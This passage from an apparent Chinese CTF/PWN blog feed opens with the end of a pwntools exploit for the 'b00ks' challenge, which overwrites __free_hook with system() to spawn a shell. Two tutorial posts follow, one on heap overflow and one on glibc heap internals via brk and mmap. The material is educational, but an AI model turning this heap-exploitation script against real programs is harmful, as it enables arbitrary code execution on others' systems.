&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter new book description: &quot;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span> * <span class="number">32</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">create(<span class="number">10</span>, <span class="string">&quot;book1_name&quot;</span>, <span class="number">200</span>, <span class="string">&quot;book1_desc&quot;</span>)</span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&quot;book2_name&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;book2_desc&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Author: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book1_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">book2_addr = book1_addr + <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">1</span>) + p64(book2_addr + <span class="number">8</span>) + p64(book2_addr + <span class="number">8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line"></span><br><span class="line">mmap_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = <span class="number">0x7ffff79e2000</span>   <span class="comment"># Change it if doesn&#x27;t work!</span></span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">&quot;__free_hook&quot;</span>] + libc_addr</span><br><span class="line">system = libc.symbols[<span class="string">&quot;system&quot;</span>] + libc_addr</span><br><span class="line">binsh = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>() + libc_addr</span><br><span class="line"></span><br><span class="line">payload2 = p64(binsh) + p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload3 = p64(system)</span><br><span class="line">edit(<span class="number">2</span>,payload3)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区写入时，写入的字节数超过了这个缓冲区本</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>简单堆溢出介绍</title>
    <link href="http://example.com/2021/03/14/%E7%AE%80%E5%8D%95%E5%A0%86%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/"/>
    <id>http://example.com/2021/03/14/%E7%AE%80%E5%8D%95%E5%A0%86%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/</id>
    <published>2021-03-13T16:58:32.000Z</published>
    <updated>2021-06-01T16:14:05.818Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>​    堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可用的字节数，因而导致了数据的溢出，并覆盖到了<strong>物理相邻</strong>的高地址的下一个堆块。</p><p>​    so，堆溢出漏洞发生的前提：</p><ul><li>写入的数据写到了堆上</li><li>写入数据的大小没有被控制</li></ul><p>堆溢出是一种特定的缓冲区溢出（还有栈溢出，bss段溢出等）。但是堆溢出并不会像栈溢出那样覆盖ret地址进而控制程序执行流。一般来说，利用堆溢出的策略：</p><ol><li>覆盖<strong>物理相邻</strong>的下一个chunk的内容</li><li>利用堆中的机制（如unlink等）来实现任意地址写入（write-anything-anwhere），或控制堆块中的内容等效果，从而控制程序的执行流。</li></ol><h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk1,*chunk2;</span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入：AAAAAAAABBBBBBBBAAAAAAAA</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x56558150</span><br><span class="line">0x56558150:0x00000000000000000x0000002100000000 &lt;= chunk1</span><br><span class="line">0x56558160:0x41414141414141410x4242424242424242</span><br><span class="line">0x56558170:0x41414141414141410x0000002100000000 &lt;= chunk2</span><br><span class="line">0x56558180:0x00000000000000000x0000000000000000</span><br><span class="line">0x56558190:0x00000000000000000x0000041100000000 &lt;=other</span><br></pre></td></tr></table></figure><p>如果输入字符串过长，会覆盖下一个chunk，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x56558150</span><br><span class="line">0x56558150:0x00000000000000000x0000002100000000 &lt;= chunk1</span><br><span class="line">0x56558160:0x41414141414141410x4242424242424242</span><br><span class="line">0x56558170:0x41414141414141410x4242424242424242 &lt;= chunk2</span><br><span class="line">0x56558180:0x00000000000000000x0000000000000000</span><br><span class="line">0x56558190:0x00000000000000000x0000041100000000 &lt;=other</span><br></pre></td></tr></table></figure><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>比较重要的几个步骤</p><h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常堆是通过调用glibc的malloc函数进行分配的，某些情况会使用calloc来分配。</p><p>malloc与calloc区别：calloc在分配后会自动清空。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure><p>此外，还有一种是由realloc进行分配的，realloc函数可以同时具备malloc和free两个函数的功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *chunk,*chunk1;</span><br><span class="line">chunk = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">chunk1 = <span class="built_in">realloc</span>(chunk,<span class="number">32</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>realloc内部会根据不同的情况进行不同的操作：</p><ul><li>当realloc(ptr,size)的size不等于ptr的size时：<ul><li>如果申请的size&gt;原来的size：<ul><li>  如果chunk与top chunk相邻，直接扩展这个chunk到新的size大小</li><li>  如果chunk与top chunk不相邻，相当于free(ptr)，malloc(new_size)</li></ul></li><li>如果申请的size&lt;原来的size：<ul><li>  如果相差不足以容下一个最小的chunk（64位下为32字节，32位下为16字节），则保持不变</li><li>  如果相差可以容下一个最小chunk，则切割原chunk为两部分，free掉后一部分。</li></ul></li></ul></li><li>  当realloc(otr,size)的size==0时，相当于free(ptr)</li><li>  当realloc(otr,size)的size==ptr的size时，不进行任何操作</li></ul><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>常见危险函数：</p><ul><li>INPUT：<ul><li>  gets：直接读取一行，忽略<code>\x00</code></li><li>  scanf</li><li>  vscanf</li></ul></li><li>OUTPUT：<ul><li>  sprintf</li></ul></li><li>String:<ul><li>  strcpy：字符串复制，遇到<code>\x00</code>停止</li><li>  strcat：字符串拼接，遇到<code>\x00</code>停止</li><li>  bcopy</li></ul></li></ul><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算开始写入的地址与要覆盖的地址之间的距离。</p><p>一个常见的误区是malloc的参数等于实际分配堆块的大小，但实际上ptmalloc分配的大小是对其的，这个长度一般是机器字长的2倍。对于不大于2倍机器字长的请求，malloc会直接返回2倍的机器字长，也就是最小chunk。</p><p>比如64位系统malloc(0)是会返回16字节的块。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;​    堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可用的字节数，因而导致了数据的溢出，并覆盖到了&lt;st</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>堆概述及其相关数据结构</title>
    <link href="http://example.com/2021/03/03/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <id>http://example.com/2021/03/03/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</id>
    <published>2021-03-03T14:18:17.000Z</published>
    <updated>2021-06-02T01:58:53.339Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h1><p>目前堆的实现有很多种，具体如下：</p><blockquote><p>dlmalloc  – General purpose allocator </p><p>ptmalloc2 – glibc </p><p>jemalloc  – FreeBSD and Firefox </p><p>tcmalloc  – Google </p><p>libumem   – Solaris</p></blockquote><p>接下来主要以glibc中堆的实现为主进行介绍。</p><h1 id="堆概述"><a href="#堆概述" class="headerlink" title="堆概述"></a>堆概述</h1><h2 id="内存分配后的系统调用"><a href="#内存分配后的系统调用" class="headerlink" title="内存分配后的系统调用"></a>内存分配后的系统调用</h2><p>在我们动态申请和释放内存时，无论是malloc还是free函数，都不是真正与系统交互的函数</p><p>这些函数的背后系统调用主要是(s)brk和mmap、munmap函数</p><p>如下图：</p><p><img src="/2021/03/03/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/1614781158558.png"></p><h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对于堆来说，操作系统提供了brk函数，glibc库提供了sbrk函数，我们也可通过增加brk的大小来向操作系统申请内存。</p><p>在一开始，堆的起始位置(start_brk)和堆的当前结尾地址(brk)指向同一地址。根据是否开启ASLR，指的位置不同</p><ul><li>未开启ASLR：start_brk和brk指向data/bss段的结尾</li><li>开启ASLR：start_brk和brk会指向data/bss段结尾后的随机偏移的位置</li></ul><p>举个小例子：(来自ctf-wiki)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sbrk and brk example */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行后3次分别如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ ./a.out </span><br><span class="line">Welcome to sbrk example:2552</span><br><span class="line">Program Break Location1:0x56c4d000</span><br><span class="line"></span><br><span class="line">Program break Location2:0x56c4e000</span><br><span class="line"></span><br><span class="line">Program Break Location3:0x56c4d000</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ cat /proc/2552/maps</span><br><span class="line">...</span><br><span class="line">56c2b000-56c4d000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">yutao@pwnbaby:~/Desktop$ cat /proc/2552/maps</span><br><span class="line">...</span><br><span class="line">56c2b000-56c4e000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">yutao@pwnbaby:~/Desktop$ cat /proc/2552/maps</span><br><span class="line">...</span><br><span class="line">56c2b000-56c4d000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>malloc会使用mmap来创建独立的匿名映射段。匿名映射的主要目的是可以申请以0填充的内存，并且这块内存仅被调用进程所使用。</p><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Private anonymous mapping example using mmap syscall */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">errExit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s failed. Exiting the process\n&quot;</span>, msg);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = <span class="literal">NULL</span>;</span><br><span class="line">        addr = mmap(<span class="literal">NULL</span>, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">                errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unmap mapped region. */</span></span><br><span class="line">        ret = munmap(addr, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">                errExit(<span class="string">&quot;munmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After munmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在执行mmap前：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~$ cat /proc/2412/maps</span><br><span class="line">5656c000-5656d000 r-xp 00000000 08:01 956125                             /home/yutao/Desktop/a.out</span><br><span class="line">5656d000-5656e000 r--p 00000000 08:01 956125                             /home/yutao/Desktop/a.out</span><br><span class="line">5656e000-5656f000 rw-p 00001000 08:01 956125                             /home/yutao/Desktop/a.out</span><br><span class="line">56fdf000-57001000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">f7d90000-f7f65000 r-xp 00000000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f65000-f7f66000 ---p 001d5000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f66000-f7f68000 r--p 001d5000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f68000-f7f69000 rw-p 001d7000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f69000-f7f6c000 rw-p 00000000 00:00 0 </span><br><span class="line">f7f82000-f7f84000 rw-p 00000000 00:00 0 </span><br><span class="line">f7f84000-f7f87000 r--p 00000000 00:00 0                                  [vvar]</span><br><span class="line">f7f87000-f7f88000 r-xp 00000000 00:00 0                                  [vdso]</span><br><span class="line">f7f88000-f7fae000 r-xp 00000000 08:01 1195828                            /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">f7fae000-f7faf000 r--p 00025000 08:01 1195828                            /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">f7faf000-f7fb0000 rw-p 00026000 08:01 1195828                            /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">ffab0000-ffad1000 rw-p 00000000 00:00 0                                  [stack]</span><br></pre></td></tr></table></figure><p>执行mmap后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~$ cat /proc/2412/maps</span><br><span class="line">5656c000-5656d000 r-xp 00000000 08:01 956125                             /home/yutao/Desktop/a.out</span><br><span class="line">5656d000-5656e000 r--p 00000000 08:01 956125                             /home/yutao/Desktop/a.out</span><br><span class="line">5656e000-5656f000 rw-p 00001000 08:01 956125                             /home/yutao/Desktop/a.out</span><br><span class="line">56fdf000-57001000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">f7d6f000-f7d90000 rw-p 00000000 00:00 0 </span><br><span class="line">f7d90000-f7f65000 r-xp 00000000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f65000-f7f66000 ---p 001d5000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f66000-f7f68000 r--p 001d5000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f68000-f7f69000 rw-p 001d7000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f69000-f7f6c000 rw-p 00000000 00:00 0 </span><br><span class="line">f7f82000-f7f84000 rw-p 00000000 00:00 0 </span><br><span class="line">f7f84000-f7f87000 r--p 00000000 00:00 0                                  [vvar]</span><br><span class="line">f7f87000-f7f88000 r-xp 00000000 00:00 0                                  [vdso]</span><br><span class="line">f7f88000-f7fae000 r-xp 00000000 08:01 1195828                            /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">f7fae000-f7faf000 r--p 00025000 08:01 1195828                            /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">f7faf000-f7fb0000 rw-p 00026000 08:01 1195828                            /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">ffab0000-ffad1000 rw-p 00000000 00:00 0                                  [stack]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>munmap：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~$ cat /proc/2412/maps</span><br><span class="line">5656c000-5656d000 r-xp 00000000 08:01 956125                             /home/yutao/Desktop/a.out</span><br><span class="line">5656d000-5656e000 r--p 00000000 08:01 956125                             /home/yutao/Desktop/a.out</span><br><span class="line">5656e000-5656f000 rw-p 00001000 08:01 956125                             /home/yutao/Desktop/a.out</span><br><span class="line">56fdf000-57001000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">f7d90000-f7f65000 r-xp 00000000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f65000-f7f66000 ---p 001d5000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f66000-f7f68000 r--p 001d5000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f68000-f7f69000 rw-p 001d7000 08:01 1195832                            /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">f7f69000-f7f6c000 rw-p 00000000 00:00 0 </span><br><span class="line">f7f82000-f7f84000 rw-p 00000000 00:00 0 </span><br><span class="line">f7f84000-f7f87000 r--p 00000000 00:00 0                                  [vvar]</span><br><span class="line">f7f87000-f7f88000 r-xp 00000000 00:00 0                                  [vdso]</span><br><span class="line">f7f88000-f7fae000 r-xp 00000000 08:01 1195828                            /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">f7fae000-f7faf000 r--p 00025000 08:01 1195828                            /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">f7faf000-f7fb0000 rw-p 00026000 08:01 1195828                            /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">ffab0000-ffad1000 rw-p 00000000 00:00 0                                  [stack]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="堆相关的数据结构"><a href="#堆相关的数据结构" class="headerlink" 